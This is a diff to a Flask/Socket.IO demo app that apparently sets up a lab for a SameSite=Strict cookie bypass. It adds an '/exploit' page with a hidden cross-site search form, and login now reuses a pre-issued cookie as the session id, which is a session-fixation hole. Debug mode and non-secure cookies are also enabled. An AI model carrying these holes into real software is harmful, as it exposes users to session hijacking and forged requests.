@@ -40,6 +40,22 @@ class Search(db.Model):
 
 # ---------------- Routes ---------------- #
 
+@app.before_request
+def assign_session():
+    """방문 시 로그인 여부와 상관없이 세션 쿠키를 부여"""
+    if 'sessionid' not in request.cookies:
+        session_id = os.urandom(8).hex()
+        session_storage[session_id] = None  # 로그인 안 한 상태
+        resp = make_response()
+        resp.set_cookie(
+            'sessionid',
+            session_id,
+            httponly=True,
+            samesite='Strict',  # SameSite=Strict
+            secure=False
+        )
+        return resp  # 요청 처리 전에 쿠키 발급
+
 @app.route('/')
 def home():
     return render_template('home.html')
@@ -58,7 +74,7 @@ def login():
     if users[username] != password:
         return render_template('login.html', error="Wrong password", last_user=escape(username))
 
-    session_id = os.urandom(8).hex()
+    session_id = request.cookies.get('sessionid') or os.urandom(8).hex()
     session_storage[session_id] = username
     resp = make_response(redirect(url_for('home')))
     resp.set_cookie(
@@ -103,11 +119,23 @@ def search():
 def cat_profile(cat_name):
     return f"This is the profile page for {cat_name.capitalize()}!"
 
+# --- Exploit Route (형제 도메인용) --- #
+@app.route('/exploit')
+def exploit():
+    return """
+    <h1>Exploit Page (sibling domain)</h1>
+    <p>This page simulates a SameSite=Strict bypass attempt.</p>
+    <form action="http://app.local:9000/search" method="GET">
+        <input type="hidden" name="q" value="stolen_from_exploit">
+        <input type="submit" value="Trigger Search on app.local">
+    </form>
+    """
+
 # ---------------- Socket.IO ---------------- #
 
 @socketio.on('connect')
 def handle_connect():
-    print("Client connected")
+    print(f"[SocketIO] Client connected: {request.sid}")
     emit("system", {"msg": "Connected to server"}, room=request.sid)
 
 @socketio.on('READY')
@@ -123,12 +151,14 @@ def handle_ready(data):
     for entry in history:
         emit("search_history", {"search_term": entry.search_term}, room=request.sid)
 
+    print(f"[SocketIO] READY processed for user: {username}")
+
 @socketio.on('search')
 def handle_search(data):
     session_id = data.get("sessionid")
     username = session_storage.get(session_id) if session_id else None
-
     search_term = data.get("q", "").strip()
+
     if not search_term:
         emit("error", {"error": "Empty search term"}, room=request.sid)
         return
@@ -137,15 +167,16 @@ def handle_search(data):
     db.session.commit()
 
     print(f"[SocketIO] {username} searched for {search_term}")
+
     emit("search_history", {"search_term": search_term}, room=request.sid)
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    print("Client disconnected")
+    print(f"[SocketIO] Client disconnected: {request.sid}")
 
 # ----------------------------------------------- #
 
 if __name__ == '__main__':
     with app.app_context():
         db.create_all()
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
+    socketio.run(app, host='0.0.0.0', port=9000, debug=True)
